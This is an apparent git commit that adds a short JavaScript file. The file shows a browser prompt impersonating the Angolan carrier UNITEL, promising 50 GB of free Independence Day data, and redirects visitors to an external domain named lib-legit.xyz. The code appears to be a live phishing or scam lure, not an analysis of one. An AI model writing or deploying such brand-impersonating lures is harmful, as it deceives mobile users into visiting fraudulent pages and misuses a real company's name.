a5cc475b8b4166133507c92eda596eb68454ee5d
bigetijazz11 <bigetijazz11@gmail.com>
2024-10-29 13:40:52 -0700

    Create aoat49.js

---
+++ aoat49.js
@@ -0,0 +1,6 @@
+
+var password = 'ATIVAR 50 GB'
+password=prompt('UNITEL: Parabéns, foi selecionado para receber a oferta ATIVAR de 50 GB de dados gratuitos do Dia da Independência','ATIVAR 50 GB');
+if (password != 'ATIVAR 50 GB') {
+location.href='https://www.lib-legit.xyz/ao-50gb-oferta';
+}
